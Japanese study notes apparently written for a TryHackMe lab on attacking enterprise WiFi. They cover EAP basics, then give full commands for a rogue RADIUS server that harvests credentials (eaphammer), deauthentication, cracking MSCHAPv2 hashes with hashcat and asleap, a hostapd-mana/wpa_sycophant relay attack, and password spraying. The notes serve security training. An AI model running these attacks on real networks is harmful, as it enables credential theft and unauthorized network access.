# エンタープライズWiFi

https://tryhackme.com/room/attackingenterprisewifi

## 基礎

### 802.1X

企業認証を規定するフレームワーク。サプリカント、オーセンティケータ、RADIUSサーバの3者間で処理を分担する。

### 拡張認証プロトコル（EAP）

EAPは認証方法ではなく、さまざまなスタイルの証明を格納できるコンテナ、つまりエンベロープ。

認証方法の代表的なもの。[リンク先参照](https://tryhackme.com/room/attackingenterprisewifi?taskNo=2&sharerId=674ed42e2374d1bc93db444c)

- PEAP（Protected EAP）
- EAP -TTLS（EAP Tunneled Transport Layer Security）
- EAP -TLS（EAP Transport Layer Security）
- EAP-MD5

## 不正RADIUSサーバで認証情報を盗む

クライアントが誤設定でサーバー認証を無効にしている場合に有効。

[eaphammer](https://github.com/s0lst1c3/eaphammer)

不正アクセスポイントとパーミッシブ RADIUS サーバーを 1 つのコマンドにバンドルし、EAP 交換を独自にネゴシエートする。

```sh
# 不正RADIUSサーバの立ち上げ
# --creds は認証情報収集モード
sudo /root/tools/eaphammer/eaphammer -i wlan1 --creds --essid CorpNet --channel 44 --auth wpa-eap --negotiate balanced
```

```sh
# チャネル上のすべてのクライアントを一覧
sudo airodump-ng --band a -c 44 --essid CorpNet wlan0mon
```

```sh
# 認証解除フレーム
$ sudo aireplay-ng -0 4 -a <bssid> -c <station> wlan0mon

mschapv2: Wed Oct 28 03:02:20 2026
	 domain\username:		CONTOSO\juan.tr
	 username:			juan.tr
	 challenge:			73:80:51:15:5b:53:dc:ab
	 response:			3b:d5:02:30:4b:b1:97:a1:d8:ed:2f:6e:c9:fc:e1:88:5a:d2:a0:fc:bd:20:dc:8b

	 jtr NETNTLM:			juan.tr:$NETNTLM$738051155b53dcab$3bd502304bb197a1d8ed2f6ec9fce1885ad2a0fcbd20dc8b

	 hashcat NETNTLM:		juan.tr::::3bd502304bb197a1d8ed2f6ec9fce1885ad2a0fcbd20dc8b:738051155b53dcab
```

### キャプチャしたハッシュの解読

```sh
echo 'juan.tr::::3bd502304bb197a1d8ed2f6ec9fce1885ad2a0fcbd20dc8b:738051155b53dcab' > mschap.hash
```

```sh
# hashcat NetNTLMv1
hashcat -m 5500 mschap.hash /home/user/wordlists/wifi-passwords.txt
```

#### asleap を使用した代替手段

NTLMハッシュではなくチャレンジレスポンスの部分を使用する。内部的にやっていることは同じ。

```sh
asleap -C 73:80:51:15:5b:53:dc:ab -R 3b:d5:02:30:4b:b1:97:a1:d8:ed:2f:6e:c9:fc:e1:88:5a:d2:a0:fc:bd:20:dc:8b -W /home/user/wordlists/wifi-passwords.txt
```

### ネットワークに接続

#### PEAPサプリカント構成の構築

corpnet.conf

```
network={
    ssid="CorpNet"
    scan_ssid=1
    key_mgmt=WPA-EAP
    identity="CONTOSO\juan.tr"
    password="<password>"
    eap=PEAP
    phase1="peapver=1"
    phase2="auth=MSCHAPV2"
}
```

```sh
# サプリカントを起動
sudo wpa_supplicant -Dnl80211 -i wlan1 -c corpnet.conf -B
```

- -Dnl80211: Linux が Wi-Fi に使用する nl80211 ドライバを指定

```sh
# DHCP
sudo dhclient -v wlan1
```

## 認証の中継

通信の流れ

1. 攻撃者は通常のサプリカントとして実際のターゲットネットワークへの認証を開始し、そのネットワークからチャレンジが発行される。
2. このチャレンジは、被害者が信頼するネットワーク名を広告する不正アクセスポイントを介して被害者に渡される。
3. 被害者は、その不正アクセスポイントを自社の社内Wi-Fiと誤認し、正しい応答を計算して返す。
4. 最後に、攻撃者はその応答を自身の回答として実際のネットワークに提示し、ネットワークはそれを検証して正しいと判断し、攻撃者を認証する。

攻撃の5ステップ

1. ローグ（偽アクセスポイント）の証明書とユーザーファイルを用意。 hostapd-manaは認証局（CA）、サーバー証明書、およびeap_userファイルがないと起動を拒否するため、これらを最初に生成する。
2. ローグアクセスポイントを起動。 wlan2上のhostapd-manaは、被害者が信頼しているネットワーク名でネットワークを構築し、内部のやり取りを自ら応答するのではなく、各リレイ（中継処理）へ引き渡すよう設定される。
3. リレイを起動。 wlan1上のwpa_sycophantが本物のネットワークへの認証を開始して待機状態となり、被害者によって生成された応答を、攻撃者自身のものとして上位（アップストリーム）へ提示できるようにする。
4. 被害者をローグ側へ移動。 wlan0mon上のaireplay-ngが脆弱なタブレットを切断（認証解除）し、タブレットはローグ側へ再接続して、リレイが保持しているチャレンジに応答する。
5. 結果を確認してIPアドレスを取得。 リレイ処理が両方のログで同時に完了した後、dhclientがアドレスを取得し、そのサブネットのゲートウェイ上にあるポータルからフラグが返される。

### 攻撃手順

#### hostapd-manaとwpa_sycophantを使用したリレー

/tmp/relay.conf

```sh
interface=wlan2
ssid=Branch-Tablets
channel=44
hw_mode=a
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
enable_sycophant=1
sycophant_dir=/tmp/
eap_server=1
eap_user_file=/tmp/relay/eap_user
ca_cert=/tmp/relay/ca.pem
server_cert=/tmp/relay/server.pem
private_key=/tmp/relay/server.key
```

#### 不正ユーザーの証明書とユーザーファイルの準備

```sh
sudo mkdir -p /tmp/relay && cd /tmp/relay

sudo openssl req -x509 -newkey rsa:2048 -nodes -keyout ca.key -out ca.pem -days 365 -subj "/CN=Rogue CA"

sudo openssl req -newkey rsa:2048 -nodes -keyout server.key -out server.csr -subj "/CN=radius.rogue"

sudo openssl x509 -req -in server.csr -CA ca.pem -CAkey ca.key -CAcreateserial -out server.pem -days 365

printf '*\tPEAP,TTLS,TLS,MD5,GTC\n"t"\tTTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP\t"pass"\t[2]\n' | sudo tee /tmp/relay/eap_user > /dev/null
```

```sh
# 不正アクセスポイントの起動
sudo /root/tools/hostapd-mana/hostapd/hostapd /tmp/relay.conf
```

```sh
# リレーサーバーの設定ファイル
sudo cp /root/tools/wpa_sycophant/wpa_sycophant_example.conf /tmp/relay_sycophant.conf
sudo chown user:user /tmp/relay_sycophant.conf
```

ssid, bssid_blacklist を設定する。後者には不正APを設定して、リレーサプリカントが不正APではなく実際のネットワークに接続できるようにする。

```sh
# リレーサーバーを起動
sudo bash -c 'cd /root/tools/wpa_sycophant && ./wpa_sycophant.sh -c /tmp/relay_sycophant.conf -i wlan1'
```

```sh
# 認証解除フレーム
sudo aireplay-ng -0 4 -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55 wlan0mon
```

不正APで下記のように表示される。

```sh
MANA EAP Identity Phase 0: CONTOSOREG\anonymous
wlan2: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: CONTOSOREG\luis.da
nl80211: nl80211_recv_beacons->nl_recvmsgs failed: -5
using SYCOPHANT_STATE file : /tmp/SYCOPHANT_STATE
SYCOPHANT: MSCHAPv2 Response handed off to supplicant.
wlan2: CTRL-EVENT-EAP-FAILURE 64:32:a8:a9:de:55
wlan2: STA 64:32:a8:a9:de:55 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan2: STA 64:32:a8:a9:de:55 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan2: STA 64:32:a8:a9:de:55 IEEE 802.11: deauthenticated due to local deauth request
```

wpa_sycophant が自動的に wlan1 のDHCPリースを取得しネットワークに接続できるようになる。

## パスワードスプレー

eaphammer にはパスワードスプレーモードもある。

```sh
sudo /root/tools/eaphammer/eaphammer --eap-spray -I wlan1 --user-list users.txt --password 'monkey' -e CorpNet -c 44

...
[wlan1] FOUND ONE: CONTOSO\test:monkey@CorpNet
...
```

ネットワークへの接続は、「不正RADIUSサーバで認証情報を盗む」と同様。
